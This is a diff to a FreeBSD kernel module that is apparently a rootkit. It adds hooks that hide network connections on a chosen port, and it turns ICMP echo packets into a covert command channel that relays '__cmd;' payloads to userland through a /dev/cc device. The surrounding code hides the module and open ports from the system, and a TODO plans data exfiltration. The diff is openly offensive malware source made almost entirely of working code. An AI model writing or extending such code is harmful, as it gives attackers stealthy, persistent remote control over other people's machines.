@@ -17,6 +17,111 @@
  */
 #include "control_module.h"
 
+/* character device functions */
+static int cdev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
+{
+    return 0;
+}
+
+static int cdev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
+{
+    return 0;
+}
+
+static int cdev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
+{
+    return 0;
+}
+
+
+static int cdev_write(struct cdev *dev, struct uio *uio, int ioflag)
+{
+    return 0;
+}
+
+/* this does the magic: pass the cli_cmd to userland component */
+static int cdev_read(struct cdev *dev, struct uio *uio, int ioflag)
+{
+	size_t slen;
+    
+    sx_xlock(&kld_sx);
+    copystr(&cli_cmd, uio->uio_iov->iov_base, strlen(cli_cmd) + 1, &slen); /* done! */
+
+    /* after reading cli_cmd can be cleared */
+    bzero(cli_cmd, 256);
+    sx_xunlock(&kld_sx);
+
+#if DEBUG
+    printf("Read %zd bytes from device /dev/%s\n", slen, cdev_devsw.d_name);
+#endif
+
+    return 0;
+}
+
+/* Kind of ugly hack to hide all new connections */
+static void tcp_input_hook(struct mbuf *m, int off0) {
+	struct tcphdr *tcp_header = NULL;
+	struct ip *ip_header = NULL;
+
+	ip_header = mtod(m, struct ip *);
+	tcp_header = (struct tcphdr *)((caddr_t)ip_header + off0);
+	
+	if (ntohs(tcp_header->th_dport) == HIDE_PORT_TEST)
+		hide_port(HIDE_PORT_TEST);
+	
+	tcp_input(m, off0);
+}
+
+/* handle incoming ICMP echo packets */
+static void icmp_input_hook(struct mbuf *m, int off0) {
+	struct icmp *icmp_header;
+	char icmp_msg[256 + 1]; /* TODO: Encrypt this */
+	int count;
+	size_t slen;
+
+	m->m_len -= off0;
+	m->m_data += off0;
+
+	icmp_header = mtod(m, struct icmp *);
+
+	m->m_len += off0;
+	m->m_data -= off0;
+
+	/* make sure it is an ICMP echo packet with actual data */
+	if (icmp_header->icmp_type == ICMP_ECHO && icmp_header->icmp_data != NULL) {
+		bzero(icmp_msg, 256);
+		copystr(icmp_header->icmp_data, icmp_msg, 256, &slen);
+
+		/* TODO: Create a heirarchy of commands for different types of data.
+		   For instance, a command for HTTP requests, data exfiltration, etc... */
+
+		/* Command Line Interface: __cmd; */
+		if (strlen(icmp_msg) > 2) {
+			if (icmp_msg[0] == '_' && icmp_msg[1] == '_') {
+				count = 2;
+
+				sx_xlock(&kld_sx);
+
+				bzero(cli_cmd, 256);
+				while (icmp_msg[count] != ';' && count < 256) {
+					cli_cmd[count - 2] = icmp_msg[count];
+					count++;
+				}
+
+				cli_cmd[count] = '\0'; /* terminate string */
+				sx_xunlock(&kld_sx);
+
+				/* TODO: send to cdev */
+#if DEBUG
+				printf("ICMP packet -> cli_cmd: %s\n", cli_cmd);
+#endif
+			}
+		}
+	}
+
+	icmp_input(m, off0);
+}
+
 /* System call to hide an open local network port. */
 static void hide_port(int lport)
 {
@@ -41,20 +146,6 @@ static void hide_port(int lport)
     }
 
     INP_INFO_WUNLOCK(&tcbinfo);
-}
-
-/* Kind of ugly hack to hide all new connections */
-static void tcp_input_hook(struct mbuf *m, int off0) {
-	struct tcphdr *th = NULL;
-	struct ip *ip = NULL;
-
-	ip = mtod(m, struct ip *);
-	th = (struct tcphdr *)((caddr_t)ip + off0);
-	
-	if (ntohs(th->th_dport) == HIDE_PORT_TEST)
-		hide_port(HIDE_PORT_TEST);
-	
-	tcp_input(m, off0);
 }
 
 static void hide_module(void)
@@ -125,14 +216,20 @@ static int module_events(struct module *module, int cmd, void *arg)
 #endif
                 hide_module();
             }
+			sx_init(&kld_sx, "kernel_lock"); /* avoiding race conditions */
 			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input_hook;
+			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+			sdev = make_dev(&cdev_devsw, 0, UID_ROOT, GID_WHEEL, 0600, "cc");
             break;
 
         case MOD_UNLOAD:
 #if DEBUG
             printf("Module %s unloaded.\n", MODULE_FILE);
 #endif
+			sx_destroy(&kld_sx);
 			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input;
+			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+			destroy_dev(sdev);
             break;
 
         default:
